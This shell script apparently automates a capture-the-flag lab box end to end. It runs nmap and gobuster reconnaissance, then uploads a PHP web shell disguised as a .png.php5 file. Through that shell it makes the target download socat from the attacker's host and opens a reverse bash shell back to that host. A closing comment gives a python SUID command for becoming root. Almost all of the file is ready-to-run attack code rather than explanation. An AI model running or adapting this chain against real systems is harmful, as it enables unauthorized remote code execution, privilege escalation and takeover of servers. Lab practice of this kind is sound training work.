#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.77.253"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories.txt

echo "2 - UPLOAD REMOTE SHELL"
SHELL=webshell.png.php5
echo "<?php" > $result_folder/$SHELL
echo "    system(\$_GET[\"cmd\"]);" >> $result_folder/$SHELL
echo " ?>" >> $result_folder/$SHELL
curl -s -F "fileUpload=@$result_folder/$SHELL;type=application/octet-stream" -F "submit=Upload" -X POST "http://$target_ip/panel/" -o $result_folder/success-upload.html
curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=cat+/var/www/user.txt -o $result_folder/user.txt
FLAG=$(cat $result_folder/user.txt | grep -a -o 'THM{[^}]*}')
echo "--> User flag is '$FLAG'"

echo "3 - PRIVILEGE ESCALATION"
curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=ls+-l+/usr/bin/ -o $result_folder/suid.txt
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true -O $result_folder/socat > /dev/null
python3 -m http.server 4444 -d $result_folder/ &
PID=$!
curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=wget+http%3A%2F%2F10%2E9%2E5%2E12%3A4444%2Fsocat+-O+socat -o /dev/null
kill -9 $PID
xterm -hold -e "socat -d -d TCP-LISTEN:4444,reuseaddr,fork STDOUT" &
PID=$!
curl -s -X GET "http:/$target_ip/uploads/$SHELL?cmd=chmod+%2Bx+socat"
curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=./socat%20TCP:$attack_ip:4444%20EXEC:%22bash%20-li%22
# Execure python -c 'import os; os.execl("/bin/sh", "sh", "-p")' in the sheel to become root. then cat /root/root.txt
